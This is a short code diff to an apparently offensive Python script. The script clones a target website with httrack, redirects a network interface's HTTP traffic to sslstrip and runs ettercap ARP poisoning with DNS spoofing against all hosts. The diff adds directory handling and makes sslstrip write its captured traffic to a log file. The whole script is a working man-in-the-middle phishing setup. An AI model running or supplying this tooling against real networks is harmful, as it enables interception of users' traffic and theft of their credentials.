@@ -72,8 +72,9 @@ def update_etter_dns(conf_path):
             f.write(new_line)
 
 def call_httrack(default_path):
+    cwd = os.getcwd()
     os.chdir(default_path)
-    subprocess.call(["rm","index.html"])
+    subprocess.call(["rm","-f","index.html"])
     try:
         subprocess.call(["httrack","--connection-per-second=50","--sockets=80", \
             "--disable-security-limits","-A100000000","-s0","-n",sys.argv[1]])
@@ -83,7 +84,8 @@ def call_httrack(default_path):
     subprocess.call(["iptables","--flush","-t","nat"])
     subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
         "80","-j","REDIRECT","--to-port","6666"])
-    subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
+    os.chdir(cwd)
+    subprocess.Popen(["sslstrip","-w","sslstrip.log","-l","6666"], stderr=subprocess.DEVNULL)
     subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
 def check_executables():
